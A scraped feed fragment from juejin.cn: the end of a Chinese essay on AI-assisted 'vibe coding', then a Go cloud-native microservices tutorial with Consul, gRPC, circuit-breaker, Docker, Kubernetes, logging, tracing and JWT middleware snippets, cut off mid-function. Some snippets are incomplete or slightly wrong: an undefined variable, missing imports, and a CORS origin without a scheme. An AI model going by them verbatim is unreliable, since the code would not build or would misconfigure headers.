我本来想“先凑合跑起来”，结果它直接给了一个可维护、可扩展、甚至还有点优雅的版本。</p>
<p>我第一次产生了一种陌生的感觉——<br/>
不是被取代，而是<strong>被超前照顾</strong>。</p>
<p>就像你刚准备自己走夜路，结果发现对方已经把路灯、护栏、导航和应急预案全都装好了。</p>
<p>那一刻，我隐约意识到：<br/>
这不是工具升级，<br/>
这是<strong>世界线发生了偏移</strong>。</p>
<hr/>
<h4 data-id="heading-5">第四章：Vibe Coding，或者说“顺着感觉就全通了”</h4>
<p>后来，我听到了一个词。<br/>
再后来，我开始理解它。</p>
<p><strong>Vibe Coding。</strong></p>
<p>它并不是“写得更快”，<br/>
而是<strong>你不再需要把每一步都想清楚。</strong></p>
<p>你只需要一个模糊的方向，一个“差不多是这样”的感觉。<br/>
剩下的部分，会像流水一样，自己找到河道。</p>
<p>以前写代码，是“运筹帷幄，步步为营”；<br/>
现在更像是“御剑而行，顺势而下”。</p>
<p>你不是失去了控制权，<br/>
而是放弃了对每一个细节的执念。</p>
<p>这对我这种人来说，是一次近乎痛苦的转变。</p>
<p>因为我终于发现：<br/>
<strong>不是我不够努力，<br/>
是这个时代，已经不要求我事无巨细。</strong></p>
<hr/>
<h4 data-id="heading-6">第五章：我曾经说过的那句话</h4>
<p>“AI 还是无法代替人类工作，还是需要人为干预才行。”</p>
<p>现在回头看，这句话并没有错。<br/>
只是它站在了<strong>旧世界的坐标系里</strong>。</p>
<p>它假设人类的价值，在于“执行”；<br/>
而新世界告诉我，人类真正不可替代的，是<strong>判断、取舍与方向感</strong>。</p>
<p>机器可以一瞬千行，<br/>
但它不知道哪一行，<strong>值得被写下来</strong>。</p>
<p>于是我不再执着于“亲手完成一切”，<br/>
而是开始思考：<br/>
<strong>什么事情，非我不可。</strong></p>
<hr/>
<h4 data-id="heading-7">终章：从零开始，但不是回到原点</h4>
<p>如果非要给 2025 年一个总结，<br/>
那它不是“失业预告”，<br/>
也不是“乌托邦降临”。</p>
<p>它更像是一次被强制触发的成长事件。</p>
<p>我没有被取代，<br/>
只是被迫升级。</p>
<p>就像某个倒霉的主角，在一次次死亡回档后，终于学会了：<br/>
不是每一条路，都要自己撞过南墙。</p>
<p>有些世界线，<br/>
顺着走，反而能活得更久一点。</p>
<p>而我，也终于承认了那件事——<br/>
从零开始，并不意味着一无所有。<br/>
有时候，它只是意味着：<br/>
<strong>你站在了一个新的起点上。</strong></p>
<p>世界没有结束，<br/>
只是加载进度条，悄悄走到了下一章。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Go语言云原生与微服务架构终极实践指南]]></title>    <link>https://juejin.cn/post/7594835618120400936</link>    <guid>https://juejin.cn/post/7594835618120400936</guid>    <pubDate>2026-01-14T09:36:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594835618120400936" data-draft-id="7594785614178009128" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Go语言云原生与微服务架构终极实践指南"/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2026-01-14T09:36:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户129615735855"/> <meta itemprop="url" content="https://juejin.cn/user/3669510360669564"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Go语言云原生与微服务架构终极实践指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3669510360669564/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户129615735855
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:36:56.000Z" title="Wed Jan 14 2026 09:36:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Go语言云原生与微服务架构终极实践指南</h2>
<h3 data-id="heading-1">一、Go语言在云原生时代的核心优势与生态定位</h3>
<p>在当今云原生技术蓬勃发展的浪潮中，Go语言凭借其独特的设计哲学和工程实用性，已确立为构建云原生应用和微服务架构的主流语言。Go语言的诞生本身就带有解决大规模分布式系统问题的基因——它由Google开发，旨在应对实际生产环境中高并发、高性能需求的挑战。</p>
<p>Go语言的静态编译特性是其最显著的优势之一。通过将应用程序及其所有依赖打包为单个二进制文件，实现了真正的“一次编译，到处运行”。这种特性与容器化部署理念完美契合，大大简化了部署流程，减少了环境依赖带来的问题。</p>
<p>在并发处理方面，Go语言提供的goroutine和channel机制，以其轻量级和高效的特性，彻底改变了传统线程模型的复杂性。一个简单的并发服务器实现展示了其优雅性：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"net/http"</span>
    <span class="hljs-string">"time"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {
    time.Sleep(<span class="hljs-number">100</span> * time.Millisecond)
    fmt.Fprintf(w, <span class="hljs-string">"请求处理完成: %s"</span>, time.Now().Format(<span class="hljs-string">"15:04:05"</span>))
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    http.HandleFunc(<span class="hljs-string">"/"</span>, handler)
    fmt.Println(<span class="hljs-string">"服务器启动在 :8080 端口"</span>)
    http.ListenAndServe(<span class="hljs-string">":8080"</span>, <span class="hljs-literal">nil</span>)
}
</code></pre>
<h3 data-id="heading-2">二、微服务架构的核心模式与Go语言实现</h3>
<h4 data-id="heading-3">服务发现与注册</h4>
<p>在微服务架构中，服务发现机制是系统弹性和可扩展性的基础。Go语言社区提供了多种成熟的解决方案，如Consul、Etcd等。以下是一个基于Consul的服务注册示例：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"log"</span>
    <span class="hljs-string">"time"</span>
    <span class="hljs-string">"github.com/hashicorp/consul/api"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">registerService</span><span class="hljs-params">(serviceName <span class="hljs-type">string</span>, port <span class="hljs-type">int</span>)</span></span> {
    config := api.DefaultConfig()
    config.Address = <span class="hljs-string">"localhost:8500"</span>
    
    client, err := api.NewClient(config)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        log.Fatal(<span class="hljs-string">"连接Consul失败:"</span>, err)
    }
    
    registration := &amp;api.AgentServiceRegistration{
        ID:      serviceName + <span class="hljs-string">"-1"</span>,
        Name:    serviceName,
        Port:    port,
        Address: <span class="hljs-string">"localhost"</span>,
        Check: &amp;api.AgentServiceCheck{
            HTTP:     fmt.Sprintf(<span class="hljs-string">"http://localhost:%d/health"</span>, port),
            Interval: <span class="hljs-string">"10s"</span>,
            Timeout:  <span class="hljs-string">"5s"</span>,
        },
    }
    
    err = client.Agent().ServiceRegister(registration)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        log.Fatal(<span class="hljs-string">"服务注册失败:"</span>, err)
    }
    
    log.Printf(<span class="hljs-string">"服务 %s 注册成功"</span>, serviceName)
}
</code></pre>
<h4 data-id="heading-4">通信协议与序列化</h4>
<p>微服务间的通信协议选择直接影响系统性能。Go语言对gRPC和Protocol Buffers的原生支持使其在性能敏感场景中表现出色：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// protobuf定义</span>
syntax = <span class="hljs-string">"proto3"</span>;

<span class="hljs-keyword">package</span> user;

service UserService {
    rpc GetUser(UserRequest) returns (UserResponse);
}

message UserRequest {
    <span class="hljs-type">string</span> user_id = <span class="hljs-number">1</span>;
}

message UserResponse {
    <span class="hljs-type">string</span> user_id = <span class="hljs-number">1</span>;
    <span class="hljs-type">string</span> name = <span class="hljs-number">2</span>;
    <span class="hljs-type">string</span> email = <span class="hljs-number">3</span>;
}
</code></pre>
<h4 data-id="heading-5">熔断与降级</h4>
<p>熔断器模式是保障系统稳定性的关键组件。Hystrix风格的实现可以保护服务免受级联故障影响：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> CircuitBreaker <span class="hljs-keyword">struct</span> {
    failures      <span class="hljs-type">int</span>
    threshold     <span class="hljs-type">int</span>
    resetTimeout  time.Duration
    lastFailure   time.Time
    state         <span class="hljs-type">string</span> <span class="hljs-comment">// "closed", "open", "half-open"</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cb *CircuitBreaker)</span></span> Execute(fn <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span>) <span class="hljs-type">error</span> {
    <span class="hljs-keyword">if</span> cb.state == <span class="hljs-string">"open"</span> {
        <span class="hljs-keyword">if</span> time.Since(cb.lastFailure) &gt; cb.resetTimeout {
            cb.state = <span class="hljs-string">"half-open"</span>
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">"熔断器开启，请求被拒绝"</span>)
        }
    }
    
    err := fn()
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        cb.failures++
        cb.lastFailure = time.Now()
        
        <span class="hljs-keyword">if</span> cb.failures &gt;= cb.threshold {
            cb.state = <span class="hljs-string">"open"</span>
        }
        <span class="hljs-keyword">return</span> err
    }
    
    <span class="hljs-keyword">if</span> cb.state == <span class="hljs-string">"half-open"</span> {
        cb.state = <span class="hljs-string">"closed"</span>
        cb.failures = <span class="hljs-number">0</span>
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
}
</code></pre>
<h3 data-id="heading-6">三、容器化部署与Kubernetes集成实践</h3>
<h4 data-id="heading-7">多阶段构建优化镜像</h4>
<p>Dockerfile的多阶段构建可以显著减小最终镜像体积：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile"># 构建阶段
FROM golang:1.19-alpine AS builder
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o main .

# 运行阶段
FROM alpine:latest
RUN apk --no-cache add ca-certificates
WORKDIR /root/
COPY --from=builder /app/main .
EXPOSE 8080
CMD ["./main"]
</code></pre>
<h4 data-id="heading-8">Kubernetes资源定义</h4>
<p>完整的Kubernetes部署描述文件展示了生产级配置：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">user-service</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span>
  <span class="hljs-attr">selector:</span>
    <span class="hljs-attr">matchLabels:</span>
      <span class="hljs-attr">app:</span> <span class="hljs-string">user-service</span>
  <span class="hljs-attr">template:</span>
    <span class="hljs-attr">metadata:</span>
      <span class="hljs-attr">labels:</span>
        <span class="hljs-attr">app:</span> <span class="hljs-string">user-service</span>
    <span class="hljs-attr">spec:</span>
      <span class="hljs-attr">containers:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">user-service</span>
        <span class="hljs-attr">image:</span> <span class="hljs-string">registry.example.com/user-service:v1.2.0</span>
        <span class="hljs-attr">ports:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">containerPort:</span> <span class="hljs-number">8080</span>
        <span class="hljs-attr">env:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">DB_HOST</span>
          <span class="hljs-attr">valueFrom:</span>
            <span class="hljs-attr">configMapKeyRef:</span>
              <span class="hljs-attr">name:</span> <span class="hljs-string">app-config</span>
              <span class="hljs-attr">key:</span> <span class="hljs-string">database.host</span>
        <span class="hljs-attr">resources:</span>
          <span class="hljs-attr">requests:</span>
            <span class="hljs-attr">memory:</span> <span class="hljs-string">"128Mi"</span>
            <span class="hljs-attr">cpu:</span> <span class="hljs-string">"100m"</span>
          <span class="hljs-attr">limits:</span>
            <span class="hljs-attr">memory:</span> <span class="hljs-string">"256Mi"</span>
            <span class="hljs-attr">cpu:</span> <span class="hljs-string">"200m"</span>
        <span class="hljs-attr">livenessProbe:</span>
          <span class="hljs-attr">httpGet:</span>
            <span class="hljs-attr">path:</span> <span class="hljs-string">/health</span>
            <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>
          <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">30</span>
          <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">10</span>
        <span class="hljs-attr">readinessProbe:</span>
          <span class="hljs-attr">httpGet:</span>
            <span class="hljs-attr">path:</span> <span class="hljs-string">/ready</span>
            <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>
          <span class="hljs-attr">initialDelaySeconds:</span> <span class="hljs-number">5</span>
          <span class="hljs-attr">periodSeconds:</span> <span class="hljs-number">5</span>
<span class="hljs-meta">---</span>
<span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span>
<span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span>
<span class="hljs-attr">metadata:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">user-service</span>
<span class="hljs-attr">spec:</span>
  <span class="hljs-attr">selector:</span>
    <span class="hljs-attr">app:</span> <span class="hljs-string">user-service</span>
  <span class="hljs-attr">ports:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span>
    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">8080</span>
  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span>
</code></pre>
<h3 data-id="heading-9">四、可观测性与监控体系建设</h3>
<h4 data-id="heading-10">结构化日志记录</h4>
<p>使用zap日志库实现高性能的结构化日志：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> logger

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"go.uber.org/zap"</span>
    <span class="hljs-string">"go.uber.org/zap/zapcore"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewLogger</span><span class="hljs-params">(env <span class="hljs-type">string</span>)</span></span> (*zap.Logger, <span class="hljs-type">error</span>) {
    config := zap.NewProductionConfig()
    
    <span class="hljs-keyword">if</span> env == <span class="hljs-string">"development"</span> {
        config = zap.NewDevelopmentConfig()
    }
    
    config.EncoderConfig.TimeKey = <span class="hljs-string">"timestamp"</span>
    config.EncoderConfig.EncodeTime = zapcore.ISO8601TimeEncoder
    config.OutputPaths = []<span class="hljs-type">string</span>{<span class="hljs-string">"stdout"</span>}
    config.ErrorOutputPaths = []<span class="hljs-type">string</span>{<span class="hljs-string">"stderr"</span>}
    
    <span class="hljs-keyword">return</span> config.Build()
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processOrder</span><span class="hljs-params">(ctx context.Context, orderID <span class="hljs-type">string</span>)</span></span> {
    logger := ctx.Value(<span class="hljs-string">"logger"</span>).(*zap.Logger)
    
    logger.Info(<span class="hljs-string">"开始处理订单"</span>,
        zap.String(<span class="hljs-string">"order_id"</span>, orderID),
        zap.Time(<span class="hljs-string">"start_time"</span>, time.Now()),
        zap.String(<span class="hljs-string">"service"</span>, <span class="hljs-string">"order-service"</span>))
    
    <span class="hljs-comment">// 业务逻辑...</span>
    
    logger.Info(<span class="hljs-string">"订单处理完成"</span>,
        zap.String(<span class="hljs-string">"order_id"</span>, orderID),
        zap.Duration(<span class="hljs-string">"duration"</span>, time.Since(startTime)),
        zap.String(<span class="hljs-string">"status"</span>, <span class="hljs-string">"success"</span>))
}
</code></pre>
<h4 data-id="heading-11">分布式追踪集成</h4>
<p>OpenTelemetry的集成实现端到端的请求追踪：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> tracing

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"context"</span>
    <span class="hljs-string">"go.opentelemetry.io/otel"</span>
    <span class="hljs-string">"go.opentelemetry.io/otel/exporters/jaeger"</span>
    <span class="hljs-string">"go.opentelemetry.io/otel/sdk/resource"</span>
    sdktrace <span class="hljs-string">"go.opentelemetry.io/otel/sdk/trace"</span>
    semconv <span class="hljs-string">"go.opentelemetry.io/otel/semconv/v1.4.0"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitTracer</span><span class="hljs-params">(serviceName <span class="hljs-type">string</span>)</span></span> (*sdktrace.TracerProvider, <span class="hljs-type">error</span>) {
    exp, err := jaeger.New(jaeger.WithCollectorEndpoint(
        jaeger.WithEndpoint(<span class="hljs-string">"http://jaeger:14268/api/traces"</span>),
    ))
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    
    tp := sdktrace.NewTracerProvider(
        sdktrace.WithBatcher(exp),
        sdktrace.WithResource(resource.NewWithAttributes(
            semconv.SchemaURL,
            semconv.ServiceNameKey.String(serviceName),
            semconv.DeploymentEnvironmentKey.String(<span class="hljs-string">"production"</span>),
        )),
    )
    
    otel.SetTracerProvider(tp)
    <span class="hljs-keyword">return</span> tp, <span class="hljs-literal">nil</span>
}

<span class="hljs-comment">// 在HTTP处理器中使用</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">instrumentedHandler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {
    tracer := otel.Tracer(<span class="hljs-string">"user-service"</span>)
    ctx, span := tracer.Start(r.Context(), <span class="hljs-string">"HandleRequest"</span>)
    <span class="hljs-keyword">defer</span> span.End()
    
    <span class="hljs-comment">// 传递追踪上下文到下游调用</span>
    req, _ := http.NewRequestWithContext(ctx, <span class="hljs-string">"GET"</span>, <span class="hljs-string">"http://other-service/api"</span>, <span class="hljs-literal">nil</span>)
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h3 data-id="heading-12">五、安全最佳实践与生产就绪策略</h3>
<h4 data-id="heading-13">安全中间件栈</h4>
<p>构建多层次的安全防护：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> middleware

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"net/http"</span>
    <span class="hljs-string">"time"</span>
    <span class="hljs-string">"golang.org/x/time/rate"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SecurityMiddleware</span><span class="hljs-params">(next http.Handler)</span></span> http.Handler {
    <span class="hljs-keyword">return</span> http.HandlerFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {
        <span class="hljs-comment">// 1. CORS配置</span>
        w.Header().Set(<span class="hljs-string">"Access-Control-Allow-Origin"</span>, <span class="hljs-string">"trusted-domain.com"</span>)
        w.Header().Set(<span class="hljs-string">"Access-Control-Allow-Methods"</span>, <span class="hljs-string">"GET, POST, PUT, DELETE"</span>)
        w.Header().Set(<span class="hljs-string">"Access-Control-Allow-Headers"</span>, <span class="hljs-string">"Content-Type, Authorization"</span>)
        
        <span class="hljs-comment">// 2. 安全头设置</span>
        w.Header().Set(<span class="hljs-string">"X-Content-Type-Options"</span>, <span class="hljs-string">"nosniff"</span>)
        w.Header().Set(<span class="hljs-string">"X-Frame-Options"</span>, <span class="hljs-string">"DENY"</span>)
        w.Header().Set(<span class="hljs-string">"X-XSS-Protection"</span>, <span class="hljs-string">"1; mode=block"</span>)
        w.Header().Set(<span class="hljs-string">"Strict-Transport-Security"</span>, <span class="hljs-string">"max-age=31536000; includeSubDomains"</span>)
        
        <span class="hljs-comment">// 3. 速率限制检查</span>
        limiter := getLimiter(r.RemoteAddr)
        <span class="hljs-keyword">if</span> !limiter.Allow() {
            http.Error(w, <span class="hljs-string">"请求过于频繁"</span>, http.StatusTooManyRequests)
            <span class="hljs-keyword">return</span>
        }
        
        next.ServeHTTP(w, r)
    })
}

<span class="hljs-comment">// JWT令牌验证中间件</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">JWTAuthMiddleware</span><span class="hljs-params">(next http.Handler)</span></span> http.Handler {
    <span class="hljs-keyword">return</span> http.HandlerFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {
        tokenString := extractToken(r)
        
        token, err := jwt.Parse(tokenString, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(token *jwt.Token)</span></span> (<span class="hljs-keyword">interface</span>{}, <span class="hljs-type">error</span>) {
            <span class="hljs-keyword">if</span> _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
                <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"非预期的签名方法: %v"</span>, token.Header[<span class="hljs-string">"alg"</span>])
            }
            <span class="hljs-keyword">return</span> []<span class="hljs-type">byte</span>(os.Getenv(<span class="hljs-string">"JWT_SECRET"</span>)), <span class="hljs-literal">nil</span>
        })
        
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> || !token.Valid {
            http.Error(w, <span class="hljs-string">"未授权的访问"</span>, http.StatusUnauthorized)
            <span class="hljs-keyword">return</span>
        }
        
        <span class="hljs-comment">// 将声明信息传递到上下文</span>
        ctx := context.WithValue(r.Context(), <span class="hljs-string">"userClaims"</span>, token.Claims)
        next.ServeHTTP(w, r.WithContext(ctx))
    })
}
</code></pre>
<h4 data-id="heading-14">配置管理与密钥存储</h4>
<p>安全地管理敏感配置：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> config

<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"context"</span>
    <span class="hljs-string">"fmt"</span>
    <span class="hljs-string">"log"</span>
    <span class="hljs-string">"github.com/spf13/viper"</span>
    secretmanager <span class="hljs-string">"cloud.google.com/go/secretmanager/apiv1"</span>
)

<span class="hljs-keyword">type</span> Config <span class="hljs-keyword">struct</span> {
    DatabaseURL  <span class="hljs-type">string</span> <span class="hljs-string">`mapstructure:"database_url"`</span>
    APIKey       <span class="hljs-type">string</span> <span class="hljs-string">`mapstructure:"api_key"`</span>
    JWTSecret    <span class="hljs-type">string</span> <span class="hljs-string">`mapstructure:"jwt_secret"`</span>
    Port         <span class="hljs-type">int</span>    <span class="hljs-string">`mapstructure:"port"`</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">LoadConfig</span><span class="hljs-params">(env <span class="hljs-type">string</span>)</span></span> (*Config, <span class="hljs-type">error</span>) {
    viper.SetConfigName(<span class="hljs-string">"config."</span> + env)
    viper.SetConfigType(<span class="hljs-string">"yaml"</span>)
    viper.AddConfigPath(<span class="hljs-string">"./config"</span>)
    viper.AddConfigPath(<span class="hljs-string">"/etc/app/"</span>)
    
    <span class="hljs-comment">// 加载基础配置</span>
    <span class="hljs-keyword">if</span> err := viper.ReadInConfig(); err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"读取配置文件失败: %w"</span>, err)
    }
    
    <span class="hljs-keyword">var</span> config Config
    <span class="hljs-keyword">if</span> err := viper.Unmarshal(&amp;config); err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"解析配置失败: %w"</span>, err)
    }
    
